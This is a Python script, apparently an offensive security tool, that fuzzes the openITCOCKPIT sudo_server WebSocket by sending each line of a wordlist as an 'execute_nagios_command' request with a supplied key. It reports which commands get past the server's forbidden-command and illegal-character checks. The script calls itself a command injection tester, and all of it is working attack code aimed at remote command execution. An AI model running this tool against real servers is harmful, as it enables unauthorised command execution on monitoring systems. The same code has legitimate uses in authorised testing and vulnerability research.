#!/usr/bin/env python3

"""
Usage:
python3 cmd_fuzzer.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e --wordlist commands.txt
"""

import argparse
import websocket
import ssl
import json
import sys

uniqid = ""
key = ""

def parse_message(message):
    try:
        return json.loads(message)
    except json.JSONDecodeError:
        print("[!] Failed to parse message:", message)
        return {}

def build_request(task, data):
    return json.dumps({
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key": key
    })

def send_command(ws, cmd):
    global uniqid
    try:
        # Receive server hello with uniqid
        hello = parse_message(ws.recv())
        if "uniqid" in hello:
            uniqid = hello["uniqid"]
        else:
            print("[!] No uniqid received from server.")
            return False

        # Send the command
        ws.send(build_request("execute_nagios_command", cmd))

        # Listen for relevant responses
        while True:
            response = parse_message(ws.recv())
            if response.get("uniqid") != uniqid:
                continue  # Skip unrelated messages

            payload = response.get("payload", "")
            if "Forbidden command" in payload or "illegal characters" in payload:
                return False  # Command rejected
            else:
                print(f"\n[+] Allowed command: {cmd}")
                return True

    except Exception as e:
        print(f"[!] Error during command send: {e}")
        return False
    finally:
        ws.close()

def main():
    global key

    parser = argparse.ArgumentParser(description="WebSocket command injection tester")
    parser.add_argument('--url', '-u', required=True, help='WebSocket URL')
    parser.add_argument('--key', '-k', required=True, help='OpenITCOCKPIT Key')
    parser.add_argument('--wordlist', '-w', required=True, help='Wordlist file with payloads')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable WebSocket debug output')
    args = parser.parse_args()

    key = args.key
    websocket.enableTrace(args.verbose)

    try:
        with open(args.wordlist, 'r') as f:
            for raw_line in f:
                payload = raw_line.strip()
                if not payload:
                    continue

                sys.stdout.write(f"Trying: {payload}\r")
                sys.stdout.flush()

                try:
                    ws = websocket.create_connection(args.url, sslopt={"cert_reqs": ssl.CERT_NONE})
                except Exception as conn_err:
                    print(f"[!] Failed to connect: {conn_err}")
                    continue

                if not send_command(ws, payload):
                    sys.stdout.write("\033[K")  # Clear line on failure

        print("\n[+] Fuzzing completed.")

    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {args.wordlist}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

if __name__ == "__main__":
    main()
